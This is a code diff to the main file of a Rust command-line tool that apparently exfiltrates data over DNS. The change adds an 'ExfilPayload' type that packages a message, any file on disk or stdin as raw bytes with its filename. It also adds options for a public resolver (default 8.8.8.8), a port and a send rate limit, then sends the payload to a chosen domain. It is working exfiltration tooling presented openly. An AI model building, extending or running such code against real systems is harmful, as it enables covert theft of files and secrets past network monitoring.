@@ -1,7 +1,8 @@
 use clap::{Parser, Subcommand};
-use client::Client;
+use client::{Client, ClientConfig, ExfilPayload};
 use error::DnsexError;
 use server::Server;
+use std::path::Path;
 use tokio::fs;
 use tokio::io::{self, AsyncReadExt};
 
@@ -34,14 +35,20 @@ enum Commands {
         #[arg(short, long)]
         domain: String,
 
+        #[arg(long, default_value = "8.8.8.8")]
+        resolver: String,
+
+        #[arg(short, long, default_value_t = 8053)]
+        port: u16,
+
         #[arg()]
         message: Option<String>,
 
         #[arg(short, long)]
         file: Option<String>,
 
-        #[arg(short, long, default_value_t = 8053)]
-        port: u16,
+        #[arg(long, default_value_t = 100)]
+        rate_limit: u64,
     },
 }
 
@@ -57,24 +64,43 @@ async fn main() -> Result<(), DnsexError> {
 
         Commands::Client {
             domain,
+            resolver,
+            port,
             message,
             file,
-            port,
+            rate_limit,
         } => {
-            let payload: String = if let Some(msg) = message {
-                msg
+            let payload = if let Some(msg) = message {
+                ExfilPayload {
+                    filename: "message.txt".to_string(),
+                    data: msg.into_bytes(),
+                }
             } else if let Some(path) = file {
-                fs::read_to_string(&path).await?
+                let path = Path::new(&path);
+                ExfilPayload {
+                    filename: path.file_name().unwrap().to_string_lossy().to_string(),
+                    data: fs::read(&path).await?,
+                }
             } else {
-                let mut buf = String::new();
+                let mut buf = Vec::new();
                 let mut stdin = io::stdin();
-                stdin.read_to_string(&mut buf).await?;
+                stdin.read_to_end(&mut buf).await?;
 
-                buf
+                ExfilPayload {
+                    filename: "stdin.bin".into(),
+                    data: buf,
+                }
             };
 
-            let client = Client::new(domain, port);
-            let _ = client.send_payload(payload.as_bytes()).await?;
+            let client_config = ClientConfig {
+                domain,
+                resolver_ip: resolver,
+                port,
+                rate_limit_ms: rate_limit,
+            };
+
+            let client = Client::new(client_config);
+            let _ = client.send_payload(payload).await?;
         }
     };
 
